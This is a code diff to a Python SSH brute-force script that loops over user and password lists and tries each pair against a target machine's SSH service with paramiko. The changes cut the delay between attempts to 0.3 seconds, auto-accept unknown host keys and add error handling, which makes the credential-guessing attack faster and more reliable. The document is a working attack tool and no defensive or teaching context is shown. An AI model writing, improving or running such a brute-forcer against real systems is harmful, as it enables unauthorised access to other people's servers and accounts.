@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import paramiko
+import socket
 import time
 
 def brute_force_ssh_connection():
@@ -17,14 +18,15 @@ def test_credentials(machine, client, all_users, all_passwords):
     for user in all_users:
         for password in all_passwords:
             try:
-                time.sleep(1)
+                time.sleep(0.3)
                 print(f"FINDING: SSH credentials: {user}:{password}")
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(machine.ip, username=user, password=password, banner_timeout=60)
-                client.close()
                 print(f"FOUND: SSH credentials: {user}:{password}")
             except paramiko.ssh_exception.AuthenticationException:
                 print("wrong_password")
-                self.client = None
+            except socket.error:
+                print("Connection went wrong")
             except:
                 print("wrong_password")
-                continue
+            client.close()
